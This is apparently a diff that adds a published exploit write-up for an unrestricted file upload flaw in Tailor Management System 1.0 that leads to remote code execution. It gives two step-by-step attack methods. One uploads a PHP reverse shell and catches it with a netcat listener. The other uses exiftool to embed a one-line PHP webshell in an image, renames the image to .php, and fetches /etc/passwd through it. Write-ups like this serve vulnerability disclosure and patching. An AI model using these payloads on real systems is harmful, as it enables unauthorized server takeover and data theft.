@@ -1,0 +1,28 @@
+# Exploit Title: Tailor Management System 1.0 - Unrestricted File Upload to Remote Code Execution
+# Exploit Author: Saeed Bala Ahmed (r0b0tG4nG)
+# Date: 2020-09-18
+# Vendor Homepage: https://www.sourcecodester.com/php/14378/tailor-management-system-php-mysql.html
+# Software Link: https://www.sourcecodester.com/download-code?nid=14378&title=Tailor+Management+System+in+PHP+MySQL
+# Affected Version: Version 1
+# Category: Web Application
+# Tested on: Parrot OS
+
+Step 1: Log in to the CMS with any valid user credentials.
+Step 2: Select Measurement Settings and click on "Set Measurement Parts".
+Step 3: Create any php payload on locally on your system. ( i used the default php webshell in /usr/share/webshells/php/php-reverse-shell.php)
+Step 4: Fill the required details and upload the php payload you created using the image upload field.
+Step 5: Select Measurement Settings and click on "View/Edit Measurement Parts".
+Step 6: Start netcat listener.
+Step 7: Use the search filter to find your measurement and click on "edit" to trigger the php payload.
+
+========================== OR ==========================
+
+Step 1: Embed an image with the code "exiftool -Comment='<?php system($_GET['cmd']); ?>' r0b0t.jpg"
+Step 2: Rename the malicious image to have include a ".php" extention. Example ( mv r0b0t.jpg r0b0t.jpg.php )
+Step 3: Log in to the CMS with any valid user credentials.
+Step 4: Select Measurement Settings and click on "Set Measurement Parts".
+Step 5: Fill the required details and upload malicious image you created using the image upload field.
+Step 6: Select Measurement Settings and click on "View/Edit Measurement Parts".
+Step 7: Use the search filter to find your measurement and click on "edit" to edit details.
+Step 8: Righ click on the broken image and copy image location.
+Step 9: Paste image location in browser and you will have RCE. ( http://localhost/img/part/r0b0t.jpg.php?cmd=cat /etc/passwd )
